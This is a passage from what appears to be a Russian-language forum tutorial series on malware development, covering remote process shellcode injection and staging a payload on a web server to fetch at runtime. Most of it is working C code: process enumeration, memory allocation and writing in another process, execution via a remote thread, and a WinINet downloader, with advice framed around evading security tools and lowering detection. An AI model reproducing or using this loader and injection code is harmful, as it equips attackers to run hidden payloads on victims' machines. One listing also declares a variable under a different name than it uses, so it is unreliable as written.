			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779449639.png"
			title="1746779449639.png"
			width="1724" height="530" loading="lazy" />
	</div><br />
<br />
Наконец, в удаленном процессе создается новый поток, который выполняет DLL.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779457528.png"
		data-src="https://osint42.org/attachments/1746779457528-png.98/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779457528-png.98/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779457528.png"
			title="1746779457528.png"
			width="1648" height="578" loading="lazy" />
	</div><br />
<br />
Проверьте, что DLL был успешно внедрен, используя вкладку &quot;модули&quot; в Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779465694.png"
		data-src="https://osint42.org/attachments/1746779465694-png.99/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779465694-png.99/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779465694.png"
			title="1746779465694.png"
			width="695" height="593" loading="lazy" />
	</div><br />
<br />
Перейдите на вкладку &quot;потоки&quot; в Process Hacker и обратите внимание на поток, который выполняет LoadLibraryW в качестве своей начальной функции.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779472031.png"
		data-src="https://osint42.org/attachments/1746779472031-png.100/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779472031-png.100/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779472031.png"
			title="1746779472031.png"
			width="712" height="315" loading="lazy" />
	</div></div>
						

							<h2>Инъекция шелл-кода в процесс</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746779866144.png"
		data-src="https://osint42.org/attachments/1746779866144-png.101/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779866144-png.101/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779866144.png"
			title="1746779866144.png"
			width="1185" height="679" loading="lazy" />
	</div><br />
<br />
Эта статья похожа на предыдущую DLL Injection с небольшими изменениями.<br />
<br />
Инъекция shellcode в процесс будет использовать практически те же самые API Windows.<br />
<br />
VirtualAllocEx - выделение памяти.<br />
<br />
WriteProcessMemory - запись полезной нагрузки в удаленный процесс.<br />
<br />
VirtualProtectEx - изменение защиты памяти.<br />
<br />
CreateRemoteThread - выполнение полезной нагрузки через новый поток.<br />
<br />
<b>Перечисление процессов</b><br />
<br />
Как и в предыдущей статье, инъекция процесса начинается с перечисления процессов.<br />
<br />
Фрагмент кода для перечисления процессов, показанный ниже, уже был объяснен в предыдущей статье.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
// Согласно документации:
// Перед вызовом функции Process32First установите член dwSize в sizeof(PROCESSENTRY32).
// Если dwSize не инициализирован, Process32First завершится с ошибкой.
PROCESSENTRY32 Proc = {
    .dwSize = sizeof(PROCESSENTRY32)
};

HANDLE hSnapShot = NULL;

// Создает снимок текущих выполняющихся процессов
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
if (hSnapShot == INVALID_HANDLE_VALUE){
    printf(&quot;[!] CreateToolhelp32Snapshot завершилось с ошибкой: %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

// Получает информацию о первом обнаруженном процессе в снимке.
if (!Process32First(hSnapShot, &amp;Proc)) {
    printf(&quot;[!] Process32First завершилось с ошибкой: %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

do {

    WCHAR LowerName[MAX_PATH * 2];

    if (Proc.szExeFile) {
        DWORD dwSize = lstrlenW(Proc.szExeFile);
        DWORD i = 0;

        RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

        // Преобразование каждого символа в Proc.szExeFile в символ в нижнем регистре
        // и сохранение его в LowerName
        if (dwSize &lt; MAX_PATH * 2) {

            for (; i &lt; dwSize; i++)
                LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

            LowerName[i++] = &#039;\0&#039;;
        }
    }

    // Если имя процесса в нижнем регистре совпадает с искомым процессом
    if (wcscmp(LowerName, szProcessName) == 0) {
        // Сохранить PID
        *dwProcessId = Proc.th32ProcessID;
        // Открыть дескриптор процесса
        *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        if (*hProcess == NULL)
            printf(&quot;[!] OpenProcess завершилось с ошибкой: %d \n&quot;, GetLastError());

        break;
    }

// Получает информацию о следующем процессе, зарегистрированном в снимке.
// Пока в снимке остается процесс, продолжаем цикл
} while (Process32Next(hSnapShot, &amp;Proc));

// Очистка
_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Инъекция Shellcode</b><br />
<br />
Для выполнения инъекции shellcode будет использована функция InjectShellcodeToRemoteProcess.<br />
<br />
Функция принимает 3 параметра:<br />
<br />
hProcess - Дескриптор открытого удаленного процесса.<br />
<br />
pShellcode - Базовый адрес и размер расшифрованного shellcode. Shellcode должен быть в виде текста перед инъекцией, потому что его нельзя редактировать, когда он уже находится в удаленном процессе.<br />
<br />
sSizeOfShellcode - Размер shellcode.<br />
<br />
<b>Функция InjectShellcodeToRemoteProcess - Фрагмент кода</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

PVOID pShellcodeAddress = NULL;

SIZE_T sNumberOfBytesWritten = NULL;
DWORD dwOldProtection = NULL;

// Выделяем память в удаленном процессе размером sSizeOfShellcode
pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (pShellcodeAddress == NULL) {
    printf(&quot;[!] VirtualAllocEx завершилось с ошибкой: %d \n&quot;, GetLastError());
    return FALSE;
}
printf(&quot;[i] Выделена память по адресу: 0x%p \n&quot;, pShellcodeAddress);


printf(&quot;[#] Нажмите &lt;Enter&gt; для записи полезной нагрузки... &quot;);
getchar();
// Записываем shellcode в выделенную память
if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
    printf(&quot;[!] WriteProcessMemory завершилось с ошибкой: %d \n&quot;, GetLastError());
    return FALSE;
}
printf(&quot;[i] Успешно записано %d байт\n&quot;, sNumberOfBytesWritten);

memset(pShellcode, &#039;\0&#039;, sSizeOfShellcode);

// Делаем память выполнимой
if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    printf(&quot;[!] VirtualProtectEx завершилось с ошибкой: %d \n&quot;, GetLastError());
    return FALSE;
}


printf(&quot;[#] Нажмите &lt;Enter&gt; для выполнения... &quot;);
getchar();
printf(&quot;[i] Выполнение полезной нагрузки... &quot;);

// Запускаем shell
if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
}

    printf(&quot;[+] DONE !\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Освобождение памяти в удаленном процессе</b><br />
<br />
VirtualFreeEx - это WinAPI, который используется для освобождения ранее выделенной памяти в удаленном процессе. Эту функцию следует вызывать только после того, как полезная нагрузка полностью выполнена, иначе это может привести к освобождению содержимого полезной нагрузки и сбою процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualFreeEx(
[in] HANDLE hProcess,
[in] LPVOID lpAddress,
[in] SIZE_T dwSize,
[in] DWORD dwFreeType
);</code></pre>
	</div>
</div><br />
VirtualFreeEx принимает такие же параметры, как и API VirtualFree, но с единственным отличием: VirtualFreeEx принимает дополнительный параметр (hProcess), который указывает целевой процесс, где находится область памяти.<br />
<br />
<b>Отладка</b><br />
<br />
Вообще отладка похожа как в этой статье:<a href="https://ru-sfera.pw/threads/razrabotka-malvari-12-inekcija-v-process.4436/" target="_blank" class="link link--external" rel="noopener">Уроки - Разработка малвари-12. Иньекция в процесс</a><br />
<br />
В качестве домашнего задания, предлагаю написать проект инъекции в произвольный процесс и самостоятельно провести отладку по алгоритму ниже.)<br />
<br />
Для примера, инъекция shellcode выполняется в процесс Notepad. Начните с открытия Notepad и присоедините к нему отладчик x64 xdbg.<br />
<ol>
<li data-xf-list-type="ol"><b>Запуск Notepad и xdbg.</b> Запустите Notepad. Откройте xdbg и выберите &quot;File&quot; &gt; &quot;Attach&quot; или используйте горячую клавишу (обычно F2). В списке процессов найдите Notepad и присоедините к нему отладчик.</li>
<li data-xf-list-type="ol"><b>Подготовка к инъекции.</b> Перед тем как начать инъекцию shellcode, убедитесь, что отладчик находится в режиме ожидания (приостановлен).</li>
<li data-xf-list-type="ol"><b>Просмотр памяти</b> Откройте окно &quot;Memory&quot; в xdbg, чтобы просмотреть области памяти, куда был инъектирован shellcode. Это позволит вам лучше понять, как он работает и что делает в памяти целевого процесса.</li>
</ol></div>
						

							<h2>Размещаем Payload удаленно на сервере</h2>

							

							

							<div class="bbWrapper">На протяжении всех статей до сих пор payload был постоянно хранящимся непосредственно внутри бинарного файла.<br />
<br />
Это быстрый и часто используемый метод для извлечения payload. К сожалению, в некоторых случаях, когда существуют ограничения по размеру payload, сохранение payload внутри кода не является осуществимым подходом. Альтернативный подход заключается в размещении payload на веб-сервере и его извлечении во время выполнения.<br />
<br />
<b>Настройка Веб-сервера</b><br />
<br />
Эта статья требует веб-сервера для размещения файла payload. Самый простой способ - использовать HTTP-сервер Python с помощью следующей команды:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python -m http.server 8000</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746780522487.png"
		data-src="https://osint42.org/attachments/1746780522487-png.102/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780522487-png.102/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780522487.png"
			title="1746780522487.png"
			width="817" height="328" loading="lazy" />
	</div><br />
<br />
Обратите внимание, что файл payload должен быть размещен в той же директории, где выполняется эта команда.<br />
<br />
Чтобы проверить работу веб-сервера, перейдите по адресу <a href="http://127.0.0.1:8000/" target="_blank" class="link link--external" rel="noopener">http://127.0.0.1:8000</a> с использованием браузера.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780531242.png"
		data-src="https://osint42.org/attachments/1746780531242-png.103/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780531242-png.103/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780531242.png"
			title="1746780531242.png"
			width="1126" height="444" loading="lazy" />
	</div><br />
<br />
<b>Плюсы и минусы данного метода</b><br />
<br />
Использование веб-сервера для хранения payload предоставляет ряд преимуществ. Во-первых, это позволяет легко обновлять и менять payload без необходимости изменения исходного кода программы.<br />
Во-вторых, это может упростить обход некоторых систем безопасности, поскольку payload не встроен напрямую в бинарный файл.<br />
<br />
<b>Тем не менее, такой подход также имеет свои недостатки. </b><br />
Веб-сервер становится критической точкой, и если он становится недоступным или блокируется, payload не будет загружен. Также возрастает риск обнаружения, если сетевая активность подозрительна или необычна для данной программы.<br />
<br />
<b>Извлечение Payload</b><br />
<br />
Для извлечения payload с веб-сервера будут использованы следующие API для Windows:<br />
<br />
InternetOpenW - Открывает сеанс интернета, который является предварительным условием для использования других интернет-функций Windows.<br />
<br />
InternetOpenUrlW - Открывает дескриптор для указанного ресурса, который является URL payload.<br />
<br />
InternetReadFile - Считывает данные из дескриптора веб-ресурса. Это дескриптор, открытый с помощью InternetOpenUrlW.<br />
<br />
InternetCloseHandle - Закрывает дескриптор.<br />
<br />
InternetSetOptionW - Устанавливает опцию Интернета.<br />
<br />
<b>Открытие сеанса интернета </b><br />
<br />
Первым шагом является открытие сеанса интернета с использованием функции InternetOpenW, которая инициализирует использование функций WinINet в приложении.<br />
Все параметры, передаваемые в WinAPI, равны NULL, так как они в основном предназначены для вопросов, связанных с прокси.<br />
<br />
Следует отметить, что установка второго параметра равным NULL эквивалентна использованию INTERNET_OPEN_TYPE_PRECONFIG, что указывает на использование текущей конфигурации системы для определения настроек прокси для подключения к Интернету.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HINTERNET InternetOpenW(
[in] LPCWSTR lpszAgent, // NULL
[in] DWORD dwAccessType, // NULL или INTERNET_OPEN_TYPE_PRECONFIG
[in] LPCWSTR lpszProxy, // NULL
[in] LPCWSTR lpszProxyBypass, // NULL
[in] DWORD dwFlags // NULL
);</code></pre>
	</div>
</div><br />
Вызов функции показан в следующем отрывке кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Открытие сеанса интернета
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);</code></pre>
	</div>
</div><br />
<b>Открытие дескриптора для Payload</b><br />
Переходим к следующему используемому WinAPI - InternetOpenUrlW, где устанавливается соединение с URL payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HINTERNET InternetOpenUrlW(
[in] HINTERNET hInternet, // Дескриптор, открытый с помощью InternetOpenW
[in] LPCWSTR lpszUrl, // URL payload
[in] LPCWSTR lpszHeaders, // NULL
[in] DWORD dwHeadersLength, // NULL
[in] DWORD dwFlags, // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
[in] DWORD_PTR dwContext // NULL
);</code></pre>
	</div>
</div><br />
Вызов функции показан в следующем отрывке кода.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);</code></pre>
	</div>
</div><br />
Пятый параметр функции использует INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID для повышения успешности запроса HTTP в случае ошибки на стороне сервера.<br />
Возможно использовать дополнительные флаги, такие как INTERNET_FLAG_IGNORE_CERT_CN_INVALID, но это остается на усмотрение разработчика.<br />
Флаги хорошо объяснены в документации Microsoft.<br />
<br />
<b>Чтение данных</b><br />
<br />
Далее используется WinAPI InternetReadFile, который считывает payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InternetReadFile(
[in] HINTERNET hFile, // Дескриптор, открытый с помощью InternetOpenUrlW
[out] LPVOID lpBuffer, // Буфер для хранения payload
[in] DWORD dwNumberOfBytesToRead, // Количество байт для чтения
[out] LPDWORD lpdwNumberOfBytesRead // Указатель на переменную, которая получает количество прочитанных байт
);</code></pre>
	</div>
</div><br />
Перед вызовом функции необходимо выделить буфер для хранения payload. Для этого используется LocalAlloc для выделения буфера той же размерности, что и payload, 272 байта.<br />
После выделения буфера можно использовать InternetReadFile для чтения payload. Функция требует указания количества байт для чтения, которое в данном случае равно 272.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)</code></pre>
	</div>
</div><br />
<b>Закрытие дескриптора интернета</b><br />
<br />
Для закрытия дескриптора интернета используется InternetCloseHandle.<br />
Это следует вызвать после успешного получения payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InternetCloseHandle(
[in] HINTERNET hInternet // Дескриптор, открытый с помощью InternetOpenW и InternetOpenUrlW
);</code></pre>
	</div>
</div><br />
<b>Закрытие соединений HTTP/S</b><br />
<br />
Важно знать, что WinAPI InternetCloseHandle не закрывает соединение HTTP/S. WinInet пытается повторно использовать соединения, и, следовательно, несмотря на закрытие дескриптора, соединение остается активным. Закрытие соединения важно для снижения возможности обнаружения. Например, создан бинарный файл, который извлекает payload с GitHub.<br />
<br />
На изображении ниже показано, что бинарный файл все еще подключен к GitHub, несмотря на то, что выполнение бинарного файла завершено.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780549768.png"
		data-src="https://osint42.org/attachments/1746780549768-png.104/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780549768-png.104/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780549768.png"
			title="1746780549768.png"
			width="1156" height="228" loading="lazy" />
	</div><br />
<br />
К счастью, решение простое. Всё, что требуется — это указать WinInet закрыть все соединения с использованием API InternetSetOptionW.<br />
<br />
Вызов InternetSetOptionW с флагом INTERNET_OPTION_SETTINGS_CHANGED заставит систему обновить кэшированную версию её интернет-настроек, что в конечном итоге приведет к закрытию сохраненных WinInet соединений.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);</code></pre>
	</div>
</div><br />
<b>Извлечение Payload - Фрагмент кода</b><br />
<br />
Функция GetPayloadFromUrl использует вышеупомянутые шаги для извлечения payload с удаленного сервера и сохраняет его в буфере.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl() {

    HINTERNET    hInternet              = NULL,
                hInternetFile          = NULL;

    PBYTE        pBytes                 = NULL;

    DWORD        dwBytesRead            = NULL;

    // Открытие дескриптора сеанса интернета
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Открытие дескриптора для URL payload
    hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Выделение буфера для payload
    pBytes = (PBYTE)LocalAlloc(LPTR, 272);

    // Чтение payload
    if (!InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)) {
        printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pBytes);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Динамическое выделение размера Payload </b><br />
<br />
Вышеуказанная реализация работает, когда размер payload известен. Если размер неизвестен или больше количества байт, указанного в InternetReadFile, может возникнуть переполнение кучи, что приведет к аварийному завершению работы программы.<br />
<br />
Один из способов решения этой проблемы заключается в том, чтобы поместить InternetReadFile в цикл while и продолжать читать постоянное количество байт, которое, в данном примере, равно 1024 байта.<br />
<br />
Байты сохраняются непосредственно во временном буфере, который имеет тот же размер, 1024 байта. Временный буфер добавляется к общему буферу, который будет непрерывно перераспределяться, чтобы вмещать каждый новый фрагмент размером 1024 байта, считанный с сервера.<br />
Как только InternetReadFile прочитает значение, которое меньше 1024, это будет индикатором достижения конца файла, и цикл завершится.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl() {

    HINTERNET    hInternet              = NULL,
                hInternetFile          = NULL;

    DWORD        dwBytesRead            = NULL;

    SIZE_T        sSize                   = NULL; // Используется в качестве общего размера payload

    PBYTE        pBytes                  = NULL; // Используется в качестве общего буфера payload
    PBYTE        pTmpBytes               = NULL; // Используется как временный буфер размером 1024 байта

    // Открытие дескриптора сеанса интернета
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Открытие дескриптора для URL payload
    hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Выделение 1024 байтов для временного буфера
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        return FALSE;
    }

    while (TRUE) {

        // Чтение 1024 байтов во временный буфер
        // InternetReadFile будет читать меньше байт в случае, если последний фрагмент меньше 1024 байтов
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
            printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Обновление размера общего буфера
        sSize += dwBytesRead;

        // В случае, если общий буфер еще не выделен
        // затем выделите его в размере считанных байтов, так как они могут быть меньше 1024 байтов
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            // В противном случае, перераспределите pBytes равным общему размеру, sSize.
            // Это необходимо для размещения всего payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            return FALSE;
        }

        // Добавить временный буфер в конец общего буфера
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // Очистите временный буфер
        memset(pTmpBytes, &#039;\0&#039;, dwBytesRead);

        // Если было прочитано меньше 1024 байтов, это означает, что достигнут конец файла
        // Следовательно, выйти из цикла
        if (dwBytesRead &lt; 1024) {
            break;
        }

        // В противном случае, читайте следующие 1024 байта
    }

    // Завершение работы
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pTmpBytes);
    LocalFree(pBytes);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Финальный фрагмент кода для размещения Payload</b><br />
<br />
Теперь функция GetPayloadFromUrl принимает 3 параметра:<br />
<ul>
<li data-xf-list-type="ul">szUrl - URL-адрес payload.</li>
<li data-xf-list-type="ul">pPayloadBytes - возвращает базовый адрес буфера, содержащего payload.</li>
<li data-xf-list-type="ul">sPayloadSize - общий размер прочитанного payload.</li>
</ul>Функция также корректно закрывает соединения HTTP/S после завершения извлечения payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
    BOOL        bSTATE            = TRUE;

    HINTERNET    hInternet         = NULL,
                hInternetFile     = NULL;

    DWORD        dwBytesRead       = NULL;

    SIZE_T        sSize             = NULL;
    PBYTE        pBytes            = NULL,
                pTmpByte          = NULL;

    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL){
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL){
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL){
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE){
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
            printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, &#039;\0&#039;, dwBytesRead);

        if (dwBytesRead &lt; 1024){
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize  = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>Примечание к реализации</b><br />
<br />
В этой статье  payload извлекается из интернета в виде сырых двоичных данных, без шифрования или обфускации.<br />
<br />
